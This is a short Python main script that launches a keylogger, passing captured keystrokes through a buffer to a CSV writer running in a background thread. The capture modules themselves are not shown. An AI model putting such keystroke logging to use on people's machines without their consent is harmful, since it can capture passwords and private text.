import sys
import threading
from buffer import Buffer
from keylogger import Keylogger
from writer import CsvWriter


def main() -> None:
    """
    The main-Method of the program
    """

    buffer = Buffer()
    keylogger = Keylogger(buffer)
    writer = CsvWriter(buffer)
    writer_thread = threading.Thread(target=writer.read_buffer)
    writer_thread.setDaemon(True)
    writer_thread.start()
    keylogger.start_logging()
    writer.__del__()
    sys.exit()


if __name__ == "__main__":
    main()
